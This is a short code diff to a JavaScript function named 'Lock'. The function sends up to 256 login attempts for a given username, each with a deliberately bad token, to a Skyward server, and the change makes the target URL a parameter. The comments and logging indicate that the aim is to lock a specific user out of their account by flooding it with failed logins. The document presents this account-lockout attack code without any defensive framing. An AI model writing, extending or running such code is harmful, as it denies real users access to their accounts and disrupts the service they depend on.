@@ -1,7 +1,7 @@
 const skye = require('./../skye/index.js');
 const token = require('./token.js');
 
-async function Lock(username, requests = 16) {
+async function Lock(username, requests = 16, skyward = process.env.SKYWARD_URL) {
   if (requests > 256) requests = 256; // Cap requests
   
   // Return unresolved promise to prevent preprocessing
@@ -11,7 +11,7 @@ async function Lock(username, requests = 16) {
       try {
         // Send virtually empty packets to authenticate
         // Pass token as garbage data
-        await skye(process.env.SKYWARD_URL).login(username, token);
+        await skye(skyward).login(username, token);
       } catch (err) {
         // Technically not necessary but catch needs content or bypassed
         console.log(`> [LOCK] Packet ${i + 1} sent.`);
